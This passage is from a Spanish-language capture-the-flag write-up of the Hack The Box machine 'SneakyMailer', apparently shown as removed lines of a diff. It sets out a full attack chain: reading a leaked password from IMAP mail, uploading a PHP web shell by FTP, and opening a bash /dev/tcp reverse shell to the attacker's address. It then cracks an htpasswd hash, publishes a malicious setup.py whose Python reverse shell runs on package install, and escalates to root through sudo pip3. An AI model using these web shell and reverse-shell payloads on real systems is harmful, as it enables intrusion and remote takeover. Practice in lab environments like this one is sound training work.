-* LIST (\HasNoChildren) &quot;.&quot; &quot;INBOX.Sent&quot;
-* LIST (\HasNoChildren) &quot;.&quot; &quot;INBOX.Deleted Items&quot;
-* LIST (\HasNoChildren) &quot;.&quot; &quot;INBOX.Sent Items&quot;
-a2 OK LIST completed
-a3 EXAMINE &quot;INBOX.Trash&quot;
-* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
-* OK [PERMANENTFLAGS ()] No permanent flags permitted
-* 0 EXISTS
-* 0 RECENT
-* OK [UIDVALIDITY 590600304] Ok
-* OK [MYRIGHTS &quot;acdilrsw&quot;] ACL
-a3 OK [READ-ONLY] Ok
-a4 EXAMINE &quot;INBOX.Sent&quot;
-* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
-* OK [PERMANENTFLAGS ()] No permanent flags permitted
-* 0 EXISTS
-* 0 RECENT
-* OK [UIDVALIDITY 590600538] Ok
-* OK [MYRIGHTS &quot;acdilrsw&quot;] ACL
-a4 OK [READ-ONLY] Ok
-a5 EXAMINE &quot;INBOX.Deleted Items&quot;
-* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
-* OK [PERMANENTFLAGS ()] No permanent flags permitted
-* 0 EXISTS
-* 0 RECENT
-* OK [UIDVALIDITY 589481592] Ok
-* OK [MYRIGHTS &quot;acdilrsw&quot;] ACL
-a5 OK [READ-ONLY] Ok
-a6 EXAMINE &quot;INBOX.Sent Items&quot;
-* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
-* OK [PERMANENTFLAGS ()] No permanent flags permitted
-* 2 EXISTS
-* 0 RECENT
-* OK [UIDVALIDITY 589480766] Ok
-* OK [MYRIGHTS &quot;acdilrsw&quot;] ACL
-a6 OK [READ-ONLY] Ok
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Examinado la ultima bandeja encontramos 2 correos existentes y visualizando el primer correo optenemos unas credenciales del usuario &lt;code&gt;developer&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;a7 FETCH 1 BODY[]
-* 1 FETCH (BODY[] {2167}
-MIME-Version: 1.0
-To: root &amp;lt;root@debian&amp;gt;
-From: Paul Byrd &amp;lt;paulbyrd@sneakymailer.htb&amp;gt;
-Subject: Password reset
-Date: Fri, 15 May 2020 13:03:37 -0500
-Importance: normal
-X-Priority: 3
-Content-Type: multipart/alternative;
-	boundary=&quot;_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_&quot;
-
---_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_
-Content-Transfer-Encoding: quoted-printable
-Content-Type: text/plain; charset=&quot;utf-8&quot;
-
-Hello administrator, I want to change this password for the developer accou=
-nt
-
-Username: developer
-Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
-
-Please notify me when you do it=20
-
---_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_
-Content-Transfer-Encoding: quoted-printable
-Content-Type: text/html; charset=&quot;utf-8&quot;
-
-&amp;lt;html xmlns:o=3D&quot;urn:schemas-microsoft-com:office:office&quot; xmlns:w=3D&quot;urn:sc=
-hemas-microsoft-com:office:word&quot; xmlns:m=3D&quot;http://schemas.microsoft.com/of=
-fice/2004/12/omml&quot; xmlns=3D&quot;http://www.w3.org/TR/REC-html40&quot;&amp;gt;&amp;lt;head&amp;gt;&amp;lt;meta ht=
-tp-equiv=3DContent-Type content=3D&quot;text/html; charset=3Dutf-8&quot;&amp;gt;&amp;lt;meta name=
-=3DGenerator content=3D&quot;Microsoft Word 15 (filtered medium)&quot;&amp;gt;&amp;lt;style&amp;gt;&amp;lt;!--
-/* Font Definitions */
-@font-face
-	{font-family:&quot;Cambria Math&quot;;
-	panose-1:2 4 5 3 5 4 6 3 2 4;}
-@font-face
-	{font-family:Calibri;
-	panose-1:2 15 5 2 2 2 4 3 2 4;}
-/* Style Definitions */
-p.MsoNormal, li.MsoNormal, div.MsoNormal
-	{margin:0in;
-	margin-bottom:.0001pt;
-	font-size:11.0pt;
-	font-family:&quot;Calibri&quot;,sans-serif;}
-.MsoChpDefault
-	{mso-style-type:export-only;}
-@page WordSection1
-	{size:8.5in 11.0in;
-	margin:1.0in 1.0in 1.0in 1.0in;}
-div.WordSection1
-	{page:WordSection1;}
---&amp;gt;&amp;lt;/style&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body lang=3DEN-US link=3Dblue vlink=3D&quot;#954F72&quot;&amp;gt;&amp;lt;div cla=
-ss=3DWordSection1&amp;gt;&amp;lt;p class=3DMsoNormal&amp;gt;Hello administrator, I want to chang=
-e this password for the developer account&amp;lt;/p&amp;gt;&amp;lt;p class=3DMsoNormal&amp;gt;&amp;lt;o:p&amp;gt;&amp;amp;nbs=
-p;&amp;lt;/o:p&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;p class=3DMsoNormal&amp;gt;Username: developer&amp;lt;/p&amp;gt;&amp;lt;p class=3DMsoNorma=
-l&amp;gt;Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C&amp;lt;/p&amp;gt;&amp;lt;p class=3DMsoNorm=
-al&amp;gt;&amp;lt;o:p&amp;gt;&amp;amp;nbsp;&amp;lt;/o:p&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;p class=3DMsoNormal&amp;gt;Please notify me when you do i=
-t &amp;lt;/p&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;=
-
---_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_--
-)
-a7 OK FETCH completed.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Como ahora disponemos de credenciales nuevas:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;code&gt;developer:m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Volemos a tratar de conectarnos por &lt;code&gt;ftp&lt;/code&gt; y esta vez la conexión es exitosa.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ftp 10.10.10.197
-Connected to 10.10.10.197.
-220 (vsFTPd 3.0.3)
-Name (10.10.10.197:fmiracle): developer
-331 Please specify the password.
-Password:
-230 Login successful.
-
-Remote system type is UNIX.
-Using binary mode to transfer files.
-ftp&amp;gt; 
-ftp&amp;gt; dir
-200 PORT command successful. Consider using PASV.
-150 Here comes the directory listing.
-drwxrwxr-x    8 0        1001         4096 Jun 30  2020 dev
-226 Directory send OK.
-ftp&amp;gt; cd dev
-250 Directory successfully changed.
-ftp&amp;gt; dir
-200 PORT command successful. Consider using PASV.
-150 Here comes the directory listing.
-drwxr-xr-x    2 0        0            4096 May 26  2020 css
-drwxr-xr-x    2 0        0            4096 May 26  2020 img
--rwxr-xr-x    1 0        0           13742 Jun 23  2020 index.php
-drwxr-xr-x    3 0        0            4096 May 26  2020 js
-drwxr-xr-x    2 0        0            4096 May 26  2020 pypi
-drwxr-xr-x    4 0        0            4096 May 26  2020 scss
--rwxr-xr-x    1 0        0           26523 May 26  2020 team.php
-drwxr-xr-x    8 0        0            4096 May 26  2020 vendor
-226 Directory send OK.
-ftp&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Despues de conectarnos visualizamos un directorio &lt;code&gt;dev&lt;/code&gt; y dentro un contenido de nombre &lt;code&gt;team.php&lt;/code&gt;, que curiosamente era la ruta de la pagina donde estaban expuestos los correos.&lt;/p&gt;
-
-&lt;p&gt;Para poder saber si tenemos permiso de escritura intentaremos subir un archivo de nombre &lt;code&gt;cmd.php&lt;/code&gt; que con el uso de la función &lt;code&gt;shell_exec&lt;/code&gt; me ejecute un comando a nivel de sistema que vamos a controlar con el parametro &lt;code&gt;cmd&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php
-    echo &quot;&amp;lt;pre&amp;gt;&quot; . shell_exec($_REQUEST['cmd']) . &quot;&amp;lt;/pre&amp;gt;&quot;;
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Comprobamos que efectivamente si podemos subir el archivo&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;ftp&amp;gt; put cmd.php
-local: cmd.php remote: cmd.php
-200 PORT command successful. Consider using PASV.
-150 Ok to send data.
-d226 Transfer complete.
-69 bytes sent in 0.00 secs (811.8411 kB/s)
-ftp&amp;gt; dir
-200 PORT command successful. Consider using PASV.
-150 Here comes the directory listing.
---wxrw-rw-    1 1001     1001           69 Apr 08 19:15 cmd.php
-drwxr-xr-x    2 0        0            4096 May 26  2020 css
-drwxr-xr-x    2 0        0            4096 May 26  2020 img
--rwxr-xr-x    1 0        0           13742 Jun 23  2020 index.php
-drwxr-xr-x    3 0        0            4096 May 26  2020 js
-drwxr-xr-x    2 0        0            4096 May 26  2020 pypi
-drwxr-xr-x    4 0        0            4096 May 26  2020 scss
--rwxr-xr-x    1 0        0           26523 May 26  2020 team.php
-drwxr-xr-x    8 0        0            4096 May 26  2020 vendor
-226 Directory send OK.
-ftp&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Visitamos la &lt;code&gt;url&lt;/code&gt;, pero esta vez apuntaremos al fichero que subimos.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Sneakymailer/sneaky3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;El servicio nos reporta un codigo de estado &lt;code&gt;400&lt;/code&gt; lo que corresponde a que el archivo no existe…&lt;/p&gt;
-
-&lt;p&gt;Pero dado a que existe un directorio &lt;code&gt;dev&lt;/code&gt; podemos pensar que puede ser un posible subdominio, asi que usaremos &lt;code&gt;gobuster&lt;/code&gt; para tratar de enumerar posibles subdominios validos existentes y usaremos el diccionario &lt;code&gt;subdomains-top1million-5000.txt&lt;/code&gt; del repositorio de &lt;code&gt;seclists&lt;/code&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/OJ/gobuster&quot;&gt;https://github.com/OJ/gobuster&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;https://github.com/danielmiessler/SecLists&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ gobuster vhost -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://sneakycorp.htb/ -t 200
-===============================================================
-Gobuster v3.1.0
-by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:          http://sneakycorp.htb/
-[+] Method:       GET
-[+] Threads:      200
-[+] Wordlist:     /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
-[+] User Agent:   gobuster/3.1.0
-[+] Timeout:      10s
-===============================================================
-2023/04/08 23:21:48 Starting gobuster in VHOST enumeration mode
-===============================================================
-Found: dev.sneakycorp.htb (Status: 200) [Size: 13742]
-                                                     
-===============================================================
-2023/04/08 23:21:58 Finished
-===============================================================
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Pues &lt;code&gt;gobuster&lt;/code&gt; nos reporta que el subdominio es valido, lo que quiere decir que el archivo que subimos antes existe, pero bajo ese subdominio.&lt;/p&gt;
-
-&lt;p&gt;Procedemos a subir nuevamente el archivo ya que a intervalos de tiempo nos lo borra&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;ftp&amp;gt; put cmd.php
-local: cmd.php remote: cmd.php
-200 PORT command successful. Consider using PASV.
-150 Ok to send data.
-226 Transfer complete.
-69 bytes sent in 0.00 secs (990.9237 kB/s)
-ftp&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Volvemos a visitar la &lt;code&gt;url&lt;/code&gt; esta vez apuntando al subdominio y al archivo subido no sin antes agregar el subdominio a nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;10.10.10.197 dev.sneakycorp.htb&quot; &amp;gt;&amp;gt; /etc/hosts
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Esta vez si podemos apuntar al archivo &lt;code&gt;cmd.php&lt;/code&gt; y con el parametro &lt;code&gt;cmd&lt;/code&gt; tal y como lo habiamos especificado, podemos ejecutar comandos.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Sneakymailer/sneaky4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Lo siguiente sera ganar acceso a la maquina, mandandonos una shell reversa a nuestra maquina local, ello lo haremos con &lt;code&gt;bash&lt;/code&gt; con el comando &lt;code&gt;bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.2/443 0&amp;gt;&amp;amp;1'&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;No olvidemos poner los &lt;code&gt;&amp;amp;&lt;/code&gt; en urleconde &lt;code&gt;%26&lt;/code&gt; para evitar problemas, y enviamos la petición&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Sneakymailer/sneaky5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Nos ponemos en escucha y recimos la conexión como el usuario &lt;code&gt;www-data&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
-Ncat: Version 7.92 ( https://nmap.org/ncat )
-Ncat: Listening on :::443
-Ncat: Listening on 0.0.0.0:443
-Ncat: Connection from 10.10.10.197.
-Ncat: Connection from 10.10.10.197:37818.
-bash: cannot set terminal process group (734): Inappropriate ioctl for device
-bash: no job control in this shell
-www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ whoami
-whoami
-www-data
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Como siempre al ser una maquina &lt;code&gt;linux&lt;/code&gt; hacemos un tratamiento de la &lt;code&gt;tty&lt;/code&gt; para que sea full interactiva y ajustamos el tamaño de las proporciones de la pantall.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ script /dev/null -c bash
-script /dev/null -c bash
-Script started, file is /dev/null
-www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ ^Z
-zsh: suspended  ncat -nlvp 443
-❯ stty raw -echo; fg
-[1]  + continued  ncat -nlvp 443
-                                reset xterm
-www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ export TERM=xterm
-www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ export SHELL=bash
-www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ stty rows 48 columns 184
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Una vez en la maquina listamos los procesos corriendo y vemos uno correspondiente a &lt;code&gt;pypi&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ ps -faux | grep 5000
-www-data  7185  0.0  0.0   3084   824 pts/0    S+   19:49   0:00  |                           \_ grep 5000
-pypi       741  0.0  0.6  36804 25824 ?        Ss   17:09   0:08 /var/www/pypi.sneakycorp.htb/venv/bin/python3 /var/www/pypi.sneakycorp.htb/venv/bin/pypi-server -i 127.0.0.1 -p 5000 -a update,download,list -P /var/www/pypi.sneakycorp.htb/.htpasswd --disable-fallback -o /var/www/pypi.sneakycorp.htb/packages
-www-data@sneakymailer:~/dev.sneakycorp.htb/dev$
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Podemos ver que se establece un tipo de conexión procediente de un archivo asi que procederemos a leeerlo&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ cat /var/www/pypi.sneakycorp.htb/.htpasswd
-pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Vemos una contraseña encryptada que procederemos a crackearla por fuerza bruta con &lt;code&gt;john&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
-Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;
-Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type instead
-Using default input encoding: UTF-8
-Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 512/512 AVX512BW 16x3])
-Will run 4 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
-soufianeelhaoui  (?)
-1g 0:00:00:08 DONE (2023-04-08 23:53) 0.1172g/s 419023p/s 419023c/s 419023C/s soulfire1..souderton16
-Use the &quot;--show&quot; option to display all of the cracked passwords reliably
-Session completed
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Obtenemos nuevas credenciales &lt;code&gt;pypi:soufianeelhaoui&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Como vimos que por detras esta configurado un &lt;code&gt;nginx&lt;/code&gt; vamos a listar los sitios disponibles del directorio &lt;code&gt;sites-available&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Encotramos el subdominio &lt;code&gt;pypi.sneakycorp.htb&lt;/code&gt; que esta en escucha por el puerto &lt;code&gt;8080&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ cat /etc/nginx/sites-available/pypi.sneakycorp.htb 
-server {
-	listen 0.0.0.0:8080 default_server;
-	listen [::]:8080 default_server;
-	server_name _;
-}
-
-
-server {
-	listen 0.0.0.0:8080;
-	listen [::]:8080;
-
-	server_name pypi.sneakycorp.htb;
-
-	location / {
-		proxy_pass http://127.0.0.1:5000;
-		proxy_set_header Host $host;
-		proxy_set_header X-Real-IP $remote_addr;
-	}
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Agregamos el subdominio al &lt;code&gt;/etc/hosts&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;10.10.10.197 pypi.sneakycorp.htb&quot; &amp;gt;&amp;gt; /etc/hosts
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Lo abrimos en el navegador&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Sneakymailer/sneaky6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Como vemos un &lt;code&gt;pypi server&lt;/code&gt; lo que podriamos hacer es tratar de crearnos nuestro propio paquete malicioso de &lt;code&gt;pypi&lt;/code&gt; y tratar de subirlo a la maquina victima e intentar colar un comando en la maquina victima.&lt;/p&gt;
-
-&lt;p&gt;Ahora la pregunta es como creamos un paquete en python?&lt;/p&gt;
-
-&lt;p&gt;Solo debes seguir la guia de este recurso donde se explica a detalle como hacerlo&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.linode.com/docs/guides/how-to-create-a-private-python-package-repository/&quot;&gt;https://www.linode.com/docs/guides/how-to-create-a-private-python-package-repository/&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;La estructura al crear un paquete debe ser similar a esta:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;linode_example/
-    linode_example/
-        __init__.py
-    setup.py
-    setup.cfg
-    README.md
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Entonces procederemos a crear una estructura similar en nuestra maquina en este caso pondre de nombre a los directorios como &lt;code&gt;package&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
- package   setup.cfg   setup.py
-❯ tree
-.
-├── package
-│   ├── __init__.py
-│   └── package
-├── setup.cfg
-└── setup.py
-
-2 directories, 3 files
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Lo siguiente sera editar el &lt;code&gt;setup.py&lt;/code&gt;, donde ademas añadiremos un codigo para ejecutarnos una &lt;code&gt;reverse shell&lt;/code&gt; que se ejecutara cuando se inicie el &lt;code&gt;setup.py&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;from setuptools import setup
-
-import socket,subprocess,os
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect((&quot;10.10.16.2&quot;,443))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])
-
-setup(
-    name='linode_example',
-    #packages=['linode_example'],
-    description='Hello world enterprise edition',
-    version='0.1',
-    url='http://github.com/example/linode_example',
-    author='Linode',
-    author_email='docs@linode.com',
-    keywords=['pip','linode','example']
-    )
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Comentar o borrar la linea de &lt;code&gt;packages=['linode_example']&lt;/code&gt; ya que suele dar problema.&lt;/p&gt;
-
-&lt;p&gt;Ahora lo que tenemos que hacer es que el servidor de la maquina victima al momento de instalar el paquete me ejecute la &lt;code&gt;reverse shell&lt;/code&gt; y eso lo hariamos creando un archivo &lt;code&gt;.pypirc&lt;/code&gt; donde definamos cual es el repositorio al cual te quieras conectar y las credenciales de autenticación que de antes la tenemos.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat ~/.pypirc
-[distutils]
-index-servers = sneakypwned
-[sneakypwned]
-repository: http://pypi.sneakycorp.htb:8080/
-username: pypi
-password: soufianeelhaoui
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Por ultimo sera ejecutar el siguiente comando para tratar de cargar el paquete en la maquina victima &lt;code&gt;python3 setup.py sdist upload -r linode&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Donde reeemplazaremos &lt;code&gt;linode&lt;/code&gt; por el nombre que pusimos el el &lt;code&gt;index-servers&lt;/code&gt; en el &lt;code&gt;.pypirc&lt;/code&gt; que en nuestro caso es sneakypwned&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python3&quot;&gt;python3 setup.py sdist upload -r sneakypwned
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ejecutamos el &lt;code&gt;setup.py&lt;/code&gt; y nos ponemos en escucha con &lt;code&gt;ncat&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
-Ncat: Version 7.92 ( https://nmap.org/ncat )
-Ncat: Listening on :::443
-Ncat: Listening on 0.0.0.0:443
-Ncat: Connection from 10.10.16.2.
-Ncat: Connection from 10.10.16.2:46076.
-# whoami
-root
-# pwd
-/home/fmiracle/Machines/Sneakymailer/content/create
-#
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Pero vemos que nos hace una conexión a nuestra propia maquina, esto es por que primero se ejecuta la conexión locamente&lt;/p&gt;
-
-&lt;p&gt;Lo que debemos hacer es volver a ponernos en escucha con &lt;code&gt;ncat&lt;/code&gt; y salir de nuestra conexión local con un &lt;code&gt;exit&lt;/code&gt; esto hara que se ejecute la conexión esta vez de la maquina victima.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
-Ncat: Version 7.92 ( https://nmap.org/ncat )
-Ncat: Listening on :::443
-Ncat: Listening on 0.0.0.0:443
-Ncat: Connection from 10.10.16.2.
-Ncat: Connection from 10.10.16.2:37168.
-# whoami
-root
-# pwd
-/home/fmiracle/Machines/Sneakymailer/content/create
-# exit
-running sdist
-running egg_info
-writing linode_example.egg-info/PKG-INFO
-writing dependency_links to linode_example.egg-info/dependency_links.txt
-writing top-level names to linode_example.egg-info/top_level.txt
-reading manifest file 'linode_example.egg-info/SOURCES.txt'
-writing manifest file 'linode_example.egg-info/SOURCES.txt'
-warning: sdist: standard file not found: should have one of README, README.rst, README.txt, README.md
-
-running check
-creating linode_example-0.1
-creating linode_example-0.1/linode_example.egg-info
-creating linode_example-0.1/package
-copying files to linode_example-0.1...
-copying setup.cfg -&amp;gt; linode_example-0.1
-copying setup.py -&amp;gt; linode_example-0.1
-copying linode_example.egg-info/PKG-INFO -&amp;gt; linode_example-0.1/linode_example.egg-info
-copying linode_example.egg-info/SOURCES.txt -&amp;gt; linode_example-0.1/linode_example.egg-info
-copying linode_example.egg-info/dependency_links.txt -&amp;gt; linode_example-0.1/linode_example.egg-info
-copying linode_example.egg-info/top_level.txt -&amp;gt; linode_example-0.1/linode_example.egg-info
-copying package/__init__.py -&amp;gt; linode_example-0.1/package
-Writing linode_example-0.1/setup.cfg
-Creating tar archive
-removing 'linode_example-0.1' (and everything under it)
-running upload
-Submitting dist/linode_example-0.1.tar.gz to http://pypi.sneakycorp.htb:8080/
-Server response (200): OK
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Recibimos la conexión desde la maquina victima como el usuario &lt;code&gt;low&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
-Ncat: Version 7.92 ( https://nmap.org/ncat )
-Ncat: Listening on :::443
-Ncat: Listening on 0.0.0.0:443
-Ncat: Connection from 10.10.10.197.
-Ncat: Connection from 10.10.10.197:45570.
-$ whoami
-low
-$ hostname -I
-10.10.10.197 dead:beef::250:56ff:feb9:6b16 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Realizamos nuevamente un tratamiento de la &lt;code&gt;tty&lt;/code&gt; como ya hicimos anteriormente, nos dirigimos al directorio personal del usuario y podemos visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;low@sneakymailer:/$ cd /home
-low@sneakymailer:/home$ ls
-low  vmail
-low@sneakymailer:/home$ cd low/
-low@sneakymailer:~$ cat user.txt 
-4a39c61b14f3e1c7c83014390f90942e
-low@sneakymailer:~$ 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Ejecutamos el comando &lt;code&gt;sudo -l&lt;/code&gt; para ver si tenemos privilegios a nivel de &lt;code&gt;sudoers&lt;/code&gt; y vemos que tenemos uno asociado al comando &lt;code&gt;pip3&lt;/code&gt; el cual podemos ejecutar como &lt;code&gt;root&lt;/code&gt; de forma temporal sin requerir contraseña.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;low@sneakymailer:~$ sudo -l
-sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
-Matching Defaults entries for low on sneakymailer:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
-
-User low may run the following commands on sneakymailer:
-    (root) NOPASSWD: /usr/bin/pip3
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Lo siguiente sera dirigirnos a nuestra web de confianza&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;https://gtfobins.github.io/&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;ahi podemos ver que si tenemos el privilegio de sudo en &lt;code&gt;pip3&lt;/code&gt;, debemos ejecutar los siguentes comandos y nos convertiremos en el usuario &lt;code&gt;root&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;low@sneakymailer:~$ TF=$(mktemp -d)
-low@sneakymailer:~$ echo &quot;import os; os.execl('/bin/sh', 'sh', '-c', 'sh &amp;lt;$(tty) &amp;gt;$(tty) 2&amp;gt;$(tty)')&quot; &amp;gt; $TF/setup.py
-low@sneakymailer:~$ sudo pip install $TF
-sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
-[sudo] password for low: 
-low@sneakymailer:~$ TF=$(mktemp -d)
-low@sneakymailer:~$ echo &quot;import os; os.execl('/bin/sh', 'sh', '-c', 'sh &amp;lt;$(tty) &amp;gt;$(tty) 2&amp;gt;$(tty)')&quot; &amp;gt; $TF/setup.py
-low@sneakymailer:~$ sudo pip3 install $TF
-sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
-Processing /tmp/tmp.25RDYk7IwK
-# whoami
-root
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Finalmente podemos dirigirnos al directorio de &lt;code&gt;root&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt; :)&lt;/p&gt;
-
